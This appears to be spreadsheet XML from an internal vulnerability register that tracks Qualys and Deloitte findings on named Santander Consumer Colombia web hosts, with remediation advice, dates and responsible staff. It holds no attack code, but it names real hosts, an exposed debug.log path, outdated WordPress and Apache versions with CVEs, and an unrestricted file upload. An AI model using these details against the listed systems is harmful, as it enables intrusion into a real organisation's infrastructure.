    <s v="El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios."/>
    <s v="Desactivar la exploración o el listado de directorios para todos los directorios."/>
    <m/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="12"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-VM--5280544726994357519"/>
    <m/>
    <x v="6"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-08-03T00:00:00"/>
    <n v="689"/>
    <d v="2024-11-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="Este QID informa de la ausencia de las siguientes cabeceras HTTP según CWE-693: Fallo del mecanismo de protección:_x000a_X-Frame-Options: Esta cabecera de respuesta HTTP mejora la protección de las aplicaciones web contra ataques de clickjacking. El clickjacking, también conocido como «ataque de redireccionamiento de la interfaz de usuario», permite a un atacante utilizar múltiples capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace de otra página cuando su intención era hacer clic en la página de nivel superior. _x000a_Protección X-XSS: Esta cabecera HTTP habilita el filtro Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de secuencias de comandos entre sitios. Protección X-XSS: 0; desactiva esta funcionalidad._x000a_X-Content-Type-Options: Esta cabecera HTTP evita ataques basados en la no coincidencia de tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. _x000a_Strict-Transport-Security: El encabezado de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que sólo se debe comunicar con él utilizando HTTPS, en lugar de HTTP."/>
    <s v="Se recomienda a los clientes que configuren correctamente las cabeceras de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security._x000a_Dependiendo del software de su servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son_x000a_X-Frame-Options:_x000a_Apache: Header always append X-Frame-Options SAMEORIGIN_x000a_nginx: add_header X-Frame-Options SAMEORIGIN;_x000a_HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN_x000a_IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME=«X-Frame-Options» VALUE=«SAMEORIGIN»&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;_x000a_X-XSS-Protection:_x000a_Apache: Header always set X-XSS-Protection «1; mode=block» _x000a_PHP: header(«X-XSS-Protection: 1; mode=block»);_x000a_X-Content-Type-Options:_x000a_Apache: Header always set X-Content-Type-Options: nosniff_x000a_HTTP Strict-Transport-Security:_x000a_Apache: Header always set Strict-Transport-Security «max-age=31536000; includeSubDomains»_x000a_Nginx: add_header Strict-Transport-Security max-age=31536000;_x000a_Nota: Los dispositivos de red que incluyen una consola HTTP/HTTPS para fines administrativos/de gestión a menudo no incluyen todas/algunas de las cabeceras de seguridad. Se trata de un problema conocido y se recomienda ponerse en contacto con el proveedor para obtener una solución."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="13"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM-8145157804596662078"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2023-12-12T00:00:00"/>
    <n v="924"/>
    <d v="2024-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad de rastreo en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta de rastreo. _x000a__x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="14"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM--3128715605565930976"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2023-12-12T00:00:00"/>
    <n v="924"/>
    <d v="2024-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="15"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="QA-VM-3127236777467466448"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2024-07-13T00:00:00"/>
    <n v="710"/>
    <d v="2024-10-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-01T00:00:00"/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad de rastreo en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta de rastreo. _x000a__x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <s v="1° fecha 31/01/2025"/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="16"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="QA-VM--3067624496152491302"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2024-07-13T00:00:00"/>
    <n v="710"/>
    <d v="2024-10-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <s v="1° fecha 31/01/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="17"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e288787e64843c1d54e31"/>
    <s v="SCO-24-CNMPO-010-VE-001"/>
    <x v="7"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.5999999999999996"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="4443"/>
    <m/>
    <d v="2024-07-10T00:00:00"/>
    <n v="713"/>
    <d v="2024-10-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha comprobado que la página web se está alojando en un servidor Apache con la versión v2.4.58 y con la librearía OpenSSLL 1.0.2k-fips que se encuentran desactualizadas."/>
    <s v="Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada se recomienda instalar los parches de seguridad específicos que pongan en riesgo la seguridad del sistema."/>
    <s v="Un atacante podría identificar el software utilizado por la aplicación con la finalidad de explotar alguna vulnerabilidad conocida para tomar el control del sistema."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="18"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-66621b583d46490637ec5b1b"/>
    <s v="SCO-24-CNMPO-006-AP-001"/>
    <x v="8"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-06T00:00:00"/>
    <n v="747"/>
    <d v="2024-09-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante los análisis realizados se ha observado la posibilidad de subir ficheros no autorizados y/o maliciosos sin que el sistema notifique ningún problema o error._x000a_En este caso en concreto se ha empleado un fichero en formato .docx (Word) el cual contiene una prueba de concepto de una macro maliciosa. La ejecución de esta macro maliciosa abre un CMD y ejecuta la función “echo” mostrando un simple mensaje."/>
    <s v="Se recomienda establecer un paso intermedio en el proceso de la subida de ficheros, por ejemplo, implementar un sistema de tipo &quot;sandbox&quot; donde se analice el archivo subido en busca de malware."/>
    <s v="Las consecuencias de una subida de ficheros arbitraria pueden ser varias, desde el control total del sistema, ejecución remota de comandos, sobrecarga del sistema de ficheros o de la base de datos, realización de ataques a otros activos del back-end, llevar a cabo un simple &quot;defacement&quot; o utilizar la aplicación para almacenar ficheros con malware."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="19"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-665f00593d46490637e0dc8e"/>
    <s v="SCO-24-CNMPO-002-AP-001"/>
    <x v="9"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/OriginacionPROD/"/>
    <n v="8001"/>
    <m/>
    <d v="2024-06-04T00:00:00"/>
    <n v="749"/>
    <d v="2024-09-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha 31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="20"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-66547ecbc382686af2c855fd"/>
    <s v="SCO-24-CNMPO-001-CO-001"/>
    <x v="10"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-27T00:00:00"/>
    <n v="757"/>
    <d v="2024-08-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas, se ha observado cómo la aplicación devuelve información relativa sobre el servidor y la versión._x000a_Esta información es mostrada en la página por defecto de Apache a la que se accede en el directorio raíz del dominio motor.santanderconsumer.co._x000a_Además, esta información también es revelada en la cabecera ‘Server’ devuelta en las respuestas procedentes del servidor."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la versión y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="21"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-66546c5fc382686af2c855f6"/>
    <s v="SCO-24-CNMPA-005-VE-001"/>
    <x v="11"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="6.4"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-27T00:00:00"/>
    <n v="757"/>
    <d v="2024-08-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-22T00:00:00"/>
    <s v="El activo afectado hace uso de Wordpress 6.4.1. Esta versión tiene asociada las siguientes vulnerabilidades:_x000a_- WP &lt; 6.5.2 - Unauthenticated Stored XSS _x000a_- WordPress &lt; 6.4.3 - Deserialization of Untrusted Data _x000a_- WordPress &lt; 6.4.3 - Admin+ PHP File Upload _x000a_- WP 6.4-6.4.1 - POP Chain_x000a__x000a_Los detalles de las vulnerabilidades públicas de esta versión del software se pueden consultar en los siguientes enlaces:_x000a_• WP 6.4-6.4.1 - POP Chain_x000a_- https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3b_x000a_- https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/_x000a_• WordPress &lt; 6.4.3 - Deserialization of Untrusted Data_x000a_- https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225_x000a_- https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/_x000a_• WordPress &lt; 6.4.3 – Admin + PHP File Upload - CVE-2024-31210_x000a_- https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a_x000a_- https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/_x000a_• WP &lt; 6.5.2 - Unauthenticated Stored XSS - CVE-2024-4439_x000a_- https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f_x000a_- https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/"/>
    <s v="Se recomienda actualizar a la versión 6.5.3 de Wordpress, ya que es la más reciente a fecha de este informe y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades. Dicha versión puede ser descargada desde el siguiente enlace: https://wordpress.org/latest.zip"/>
    <s v="El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante las vulnerabilidades mencionadas anteriormente, lo cual puede poner en riesgo al activo afectado."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="22"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-66546d9ac382686af2c855f7"/>
    <s v="SCO-24-CNMPA-005-CO-002"/>
    <x v="12"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-27T00:00:00"/>
    <n v="757"/>
    <d v="2024-08-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El fichero wp-cron.php es el responsable de los eventos programados en un sitio web de WordPress. De forma predeterminada, cuando se realiza una solicitud, WordPress generará una solicitud adicional al archivo wp-cron.php. Al generar un gran número de solicitudes al sitio web, es posible hacer que el sitio realice un ataque DoS contra sí mismo._x000a_Se ha detectado que el fichero wp-cron.php está expuesto en Internet."/>
    <s v="Se recomienda deshabilitar y restringir el acceso al fichero wp-cron.php. Para ello añadir la siguiente variable en el fichero wp-config.php:_x000a__x000a_• DISABLE_WP_CRON=true"/>
    <s v="La exposición del fichero wp-cron.php puede suponer un riesgo ya que un atacante puede comprometer la disponibilidad del sitio debido a que es posible aumentar el consumo del proceso de Wordpress realizando numerosas peticiones a este fichero, provocando una denegación de servicio. Para esta vulnerabilidad existe un exploit público. El exploit no ha sido ejecutado contra el activo ya que incumple los puntos acordados en el contrato de Deloitte."/>
    <s v="1° Fecha: 28/02/2025"/>
    <s v="Solventada/pendiente de certificación "/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="23"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-654e2b58f74e327f9d115ec6"/>
    <s v="SC-23-CNMPO-009-VE-001"/>
    <x v="11"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="6.5"/>
    <s v="CVE-2023-0286_x000a_CVE-2022-4304_x000a_CVE-2022-4203_x000a_CVE-2016-0736_x000a_CVE-2016-2161_x000a_CVE-2017-9798"/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2023-10-11T00:00:00"/>
    <n v="986"/>
    <d v="2024-01-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el activo afectado posee unas versiones de OpenSSL y Apache con vulnerabilidades públicas asociadas._x000a_Los detalles de las vulnerabilidades públicas de esta versión de OpenSSL se pueden consultar en los siguientes enlaces:_x000a_https://www.cybersecurity-help.cz/vdb/openssl_software_foundation/openssl/1.0.2k/_x000a_Los detalles de las vulnerabilidades públicas de esta versión de Apache se pueden consultar en los siguientes enlaces:_x000a_https://vulmon.com/searchpage?q=apache+http+server+2.4.6"/>
    <s v="Se recomienda actualizar las versiones de OpenSSL y Apache y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades. Las últimas versiones de OpenSSL y Apache pueden ser descargadas desde el siguiente enlace: _x000a_• https://www.openssl.org/source/ _x000a_• https://httpd.apache.org/download.cgi"/>
    <s v="El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante vulnerabilidades conocidas, lo cual puede poner en riesgo al activo afectado."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="24"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-651c2a96f74e327f9d0a2f05"/>
    <s v="SC-23-CNMPA-004-AP-007"/>
    <x v="13"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2023-10-03T00:00:00"/>
    <n v="994"/>
    <d v="2024-01-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <s v="Se ha detectado que es posible acceder a un archivo log del servidor. Este expone rutas internas del servidor, archivos que están presentes en la máquina, plugins de Wordpress que han sido instalados, entre otra información de interés para un atacante._x000a_santanderfinancing.com/0yqtb4fy5hutpda/debug.log"/>
    <s v="Eliminar todos los archivos log del servidor cuyo mantenimiento no sea indispensable para el funcionamiento del aplicativo._x000a_Adicionalmente, para aquellos ficheros que sea indispensable mantener, su acceso debe estar protegido y restringido a los usuarios necesarios."/>
    <s v="Conocer este tipo de información, puede ayudar a un atacante a localizar vulnerabilidades conocidas con el software instalado o ayudarle a planificar ataques más elaborados contra la plataforma. Por ejemplo, las rutas donde se sitúan los archivos accesibles por el servidor Xampp son fácilmente identificables visualizando el fichero Log."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="25"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-651c2afef74e327f9d0a2f06"/>
    <s v="SC-23-CNMPA-004-AP-008"/>
    <x v="14"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2023-10-03T00:00:00"/>
    <n v="994"/>
    <d v="2024-01-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
